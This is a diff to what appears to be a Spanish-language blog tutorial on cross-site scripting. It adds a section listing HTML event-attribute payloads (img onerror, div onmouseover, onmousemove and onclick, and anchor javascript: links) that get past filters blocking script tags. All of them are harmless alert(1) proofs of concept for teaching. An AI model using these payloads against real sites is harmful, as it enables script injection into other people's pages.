@@ -73,5 +73,57 @@ Además no solo eso, si el payload contiene algo como esto,
 
 tambien pasaria, ya que al solo pasar la validación una vez, elimina los tags script, pero al eliminarlos se forman nuevos.
 
+### Payload dentro de HTML
 
+Puede que haya unas validaciones muy fuertes que bloqueen el tag script, pero si se permita añadir html, y con ello poder meter nuestro payload.
+
+Ejemplos:
+
+* En el tag img, al no tener una imagen correcta salta a la propiedad onerror donde esta nuestro alert haciendo que se ejecute.
+
+{% highlight sql linenos %}
+
+<img src='pppp' onerror='alert(1)' />
+
+{% endhighlight %}
+
+* En el tag div tenemos las propiedades onmouseover (hay que mover el ratón fuera)
+
+{% highlight sql linenos %}
+
+<div id="sub1" onmouseover="javascript:alert('1');">some text</div>
+
+{% endhighlight %}
+
+* Tambien con el tag div tenemos la propiedad onmousemove (mover el ratón), además de onmousemove y onmouseover se incluyen todas las demas propiedades relacionadas con [eventos de ratón](https://www.w3schools.com/tags/ref_eventattributes.asp){:target="_blank"} 
+
+{% highlight sql linenos %}
+
+<div id="sub1" onmousemove="javascript:alert('1');">some text</div>
+
+{% endhighlight %}
+
+* O la propiedad onclick dentro de div (dar a click dentro de el texto)
+
+{% highlight sql linenos %}
+
+<div id="sub1" onclick="javascript:alert('1');">some text</div>
+
+{% endhighlight %}
+
+* Además de el tag img o el tag div, tambien podemos usar el tag a de html donde usando las mismas propiedades que hemos visto antes.
+
+{% highlight sql linenos %}
+
+<a onmousemove="javascript:alert('1');">click here</a>
+
+{% endhighlight %}
+
+* O directamente creando un link, donde al pulsar el link ejecutamos el payload
+
+{% highlight sql linenos %}
+
+<a href='javascript:alert(1)'>click here</a>
+
+{% endhighlight %}
 
